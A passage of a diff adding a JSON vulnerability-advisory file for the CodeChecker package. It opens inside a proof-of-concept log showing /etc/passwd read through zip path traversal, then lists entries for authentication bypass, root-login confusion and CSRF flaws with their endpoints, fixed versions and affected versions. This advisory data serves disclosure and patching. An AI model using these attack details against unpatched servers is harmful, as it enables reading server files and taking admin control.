file(s).\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:444 __store_source_files() - Storing source file: /etc/passwd\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:444 __store_source_files() - Storing source file: /home/discookie/.codechecker/tmpx7hg1teb/root/etc/passwd\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:453 __store_source_files() - /etc/passwd not found or already stored.\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:463 __store_source_files() - 17 fileid found\n[INFO][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:64 __exit__() - [poc] Store source files done... (duration: 0.01 sec)\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:1363 store() - Storing into run 'poc' locked at '2023-10-25 14:30:31.615536'.\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:686 __add_or_update_run() - Adding run 'poc'...\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:730 __add_or_update_run() - Adding run history.\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:755 __add_or_update_run() - Adding run done.\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:761 __add_or_update_run() - Storing analysis statistics done.\n[INFO][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:61 __enter__() - [poc] Store reports...\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:1163 __store_reports() - Get reports from '/home/discookie/.codechecker/tmpx7hg1teb/reports' directory\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:1163 __store_reports() - Get reports from '/home/discookie/.codechecker/tmpx7hg1teb/reports/a7d0fa2d60d08ff39d519756917aaf43' directory\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:1175 __store_reports() - Parsing input file 'sample.plist'\n[DEBUG][2023-10-25 14:30:31] {report-converter} [2043] <139754026274816> - hash.py:208 get_report_path_hash() - 2|12|Path traversal|/etc/passwdcore.DivideZero3d3a7db6520247eaf90719a53d7103e2\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:987 __process_report_file() - Storing report to the database...\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:827 __add_report_context() - Storing bug path positions.\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:834 __add_report_context() - Storing bug path events.\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:842 __add_report_context() - Storing notes.\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:853 __add_report_context() - Storing macro expansions.\n[INFO][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:1220 __store_reports() - [poc] Processed 1 analyzer result file(s).\n[INFO][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:64 __exit__() - [poc] Store reports done... (duration: 0.1 sec)\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:1260 finish_checker_run() - Finishing checker run\n[INFO][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:1397 store() - 'Anonymous' stored results (3 KB /decompressed/) to run 'poc' (id: 16)  in 0.15 seconds.\n[INFO][2023-10-25 14:30:31] {store_time} [2043] <139754026274816> - mass_store_run.py:1414 store() - 2023-10-25T14:30:31.612326, 0.15s, \"Default\", \"poc\", 3KB, 1, 16\n[DEBUG][2023-10-25 14:30:31] {profiler} [2043] <139754026274816> - profiler.py:59 debug_wrapper() - [0.173351s] massStoreRun\n```\n</details>\n\n## Impact\nThe path traversal vulnerability allows reading data on the machine of the `CodeChecker server`, with the same permission level as the `CodeChecker server` process. This allows for the exfiltration from the server-side storage medium.\nIf the `CodeChecker server` is run with authentication enabled (not the default configuration), then the attack requires a valid user account on the `CodeChecker server`, with the permission to store to a database, and view the stored reports.\n\nCVSS 3.1 Base Score: 6.5\n[AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N&version=3.1)\n\nReproducible up to version `6.22.1`.",
+      "published": "2024-06-24T16:18:09Z",
+      "modified": "2024-06-26T22:00:45.835205Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/Ericsson/codechecker/security/advisories/GHSA-h26w-r4m5-8rrf"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-49793"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/Ericsson/codechecker/commit/46bada41e32f3ba0f6011d5c556b579f6dddf07a"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/Ericsson/codechecker"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/codechecker/PYSEC-2024-54.yaml"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-h26w-r4m5-8rrf",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.23.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "6.16.0",
+        "6.16.0a1",
+        "6.17.0",
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.19.0",
+        "6.19.1",
+        "6.20.0",
+        "6.20.0rc1",
+        "6.21.0",
+        "6.21.0rc1",
+        "6.22.0",
+        "6.22.0rc1",
+        "6.22.1",
+        "6.22.2",
+        "6.22.2.post1",
+        "6.23.0rc2"
+      ],
+      "affected_conda_versions": [
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.20.0"
+      ]
+    },
+    {
+      "id": "PYSEC-2024-183",
+      "primary_id": "CVE-2024-10082",
+      "aliases": [
+        "CVE-2024-10082",
+        "GHSA-fpm5-2wcj-vfr7"
+      ],
+      "cve_ids": [
+        "CVE-2024-10082"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "codechecker",
+      "summary": null,
+      "details": "CodeChecker is an analyzer tooling, defect database and viewer extension for the Clang Static Analyzer and Clang Tidy. \nAuthentication method confusion allows logging in as the built-in root user from an external service. The built-in root user up until 6.24.1 is generated in a weak manner, cannot be disabled, and has universal access.This vulnerability allows an attacker who can create an account on an enabled external authentication service, to log in as the root user, and access and control everything that can be controlled via the web interface.\u00a0The attacker needs to acquire the username of the root user to be successful.\n\nThis issue affects CodeChecker: through 6.24.1.",
+      "published": "2024-11-06T15:15:11Z",
+      "modified": "2025-01-19T04:56:49.317560Z",
+      "severity": null,
+      "all_severity": [],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://github.com/Ericsson/codechecker/security/advisories/GHSA-fpm5-2wcj-vfr7"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/PYSEC-2024-183",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.24.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "6.16.0",
+        "6.16.0a1",
+        "6.17.0",
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.19.0",
+        "6.19.1",
+        "6.20.0",
+        "6.20.0rc1",
+        "6.21.0",
+        "6.21.0rc1",
+        "6.22.0",
+        "6.22.0rc1",
+        "6.22.1",
+        "6.22.2",
+        "6.22.2.post1",
+        "6.23.0",
+        "6.23.0rc2",
+        "6.23.1",
+        "6.24.0",
+        "6.24.1"
+      ],
+      "affected_conda_versions": [
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.20.0"
+      ]
+    },
+    {
+      "id": "PYSEC-2024-238",
+      "primary_id": "CVE-2024-10081",
+      "aliases": [
+        "CVE-2024-10081",
+        "GHSA-f3f8-vx3w-hp5q"
+      ],
+      "cve_ids": [
+        "CVE-2024-10081"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "codechecker",
+      "summary": null,
+      "details": "CodeChecker is an analyzer tooling, defect database and viewer extension for the Clang Static Analyzer and Clang Tidy. \nAuthentication bypass occurs when the API URL ends with Authentication. This bypass allows superuser access to all API endpoints other than Authentication. These endpoints include the ability to add, edit, and remove products, among others. All endpoints, apart from the /Authentication is affected by the vulnerability.\n\nThis issue affects CodeChecker: through 6.24.1.",
+      "published": "2024-11-06T15:15:11Z",
+      "modified": "2025-04-08T11:13:06.669134Z",
+      "severity": null,
+      "all_severity": [],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://github.com/Ericsson/codechecker/security/advisories/GHSA-f3f8-vx3w-hp5q"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/PYSEC-2024-238",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.24.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "6.16.0",
+        "6.16.0a1",
+        "6.17.0",
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.19.0",
+        "6.19.1",
+        "6.20.0",
+        "6.20.0rc1",
+        "6.21.0",
+        "6.21.0rc1",
+        "6.22.0",
+        "6.22.0rc1",
+        "6.22.1",
+        "6.22.2",
+        "6.22.2.post1",
+        "6.23.0",
+        "6.23.0rc2",
+        "6.23.1",
+        "6.24.0",
+        "6.24.1"
+      ],
+      "affected_conda_versions": [
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.20.0"
+      ]
+    },
+    {
+      "id": "PYSEC-2024-54",
+      "primary_id": "CVE-2023-49793",
+      "aliases": [
+        "CVE-2023-49793",
+        "GHSA-h26w-r4m5-8rrf"
+      ],
+      "cve_ids": [
+        "CVE-2023-49793"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "codechecker",
+      "summary": null,
+      "details": "CodeChecker is an analyzer tooling, defect database and viewer extension for the Clang Static Analyzer and Clang Tidy. Zip files uploaded to the server endpoint of `CodeChecker store` are not properly sanitized. An attacker, using a path traversal attack, can load and display files on the machine of `CodeChecker server`. The vulnerable endpoint is `/Default/v6.53/CodeCheckerService@massStoreRun`. The path traversal vulnerability allows reading data on the machine of the `CodeChecker server`, with the same permission level as the `CodeChecker server`.\nThe attack requires a user account on the `CodeChecker server`, with permission to store to a server, and view the stored report. This vulnerability has been patched in version 6.23.",
+      "published": "2024-06-24T18:15:00Z",
+      "modified": "2024-06-26T19:42:37.515009Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://github.com/Ericsson/codechecker/security/advisories/GHSA-h26w-r4m5-8rrf"
+        },
+        {
+          "type": "FIX",
+          "url": "https://github.com/Ericsson/codechecker/commit/46bada41e32f3ba0f6011d5c556b579f6dddf07a"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/PYSEC-2024-54",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.23.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "6.16.0",
+        "6.16.0a1",
+        "6.17.0",
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.19.0",
+        "6.19.1",
+        "6.20.0",
+        "6.20.0rc1",
+        "6.21.0",
+        "6.21.0rc1",
+        "6.22.0",
+        "6.22.0rc1",
+        "6.22.1",
+        "6.22.2",
+        "6.22.2.post1",
+        "6.23.0rc2"
+      ],
+      "affected_conda_versions": [
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.20.0"
+      ]
+    },
+    {
+      "id": "PYSEC-2025-12",
+      "primary_id": "CVE-2024-53829",
+      "aliases": [
+        "CVE-2024-53829",
+        "GHSA-f8c8-4pm7-w885"
+      ],
+      "cve_ids": [
+        "CVE-2024-53829"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "codechecker",
+      "summary": null,
+      "details": "CodeChecker is an analyzer tooling, defect database and viewer extension for the Clang Static Analyzer and Clang Tidy. \nCross-site request forgery allows an unauthenticated attacker to hijack the authentication of a logged in user, and use the web API with the same permissions,\u00a0including but not limited to adding, removing or editing products. The attacker needs to know the ID of the available products to modify or delete them. The attacker cannot directly exfiltrate data (view) from CodeChecker, due to being limited to form-based CSRF.\n\nThis issue affects CodeChecker: through 6.24.4.",
+      "published": "2025-01-21T15:15:13Z",
+      "modified": "2025-04-08T11:13:16.130271Z",
+      "severity": null,
+      "all_severity": [],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://github.com/Ericsson/codechecker/security/advisories/GHSA-f8c8-4pm7-w885"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/PYSEC-2025-12",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.25.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "6.16.0",
+        "6.16.0a1",
+        "6.17.0",
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.19.0",
+        "6.19.1",
+        "6.20.0",
+        "6.20.0rc1",
+        "6.21.0",
+        "6.21.0rc1",
+        "6.22.0",
+        "6.22.0rc1",
+        "6.22.1",
+        "6.22.2",
+        "6.22.2.post1",
+        "6.23.0",
+        "6.23.0rc2",
+        "6.23.1",
+        "6.24.0",
+        "6.24.1",
+        "6.24.2",
+        "6.24.4"
+      ],
+      "affected_conda_versions": [
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.20.0"
+      ]
+    }
+  ]
+}
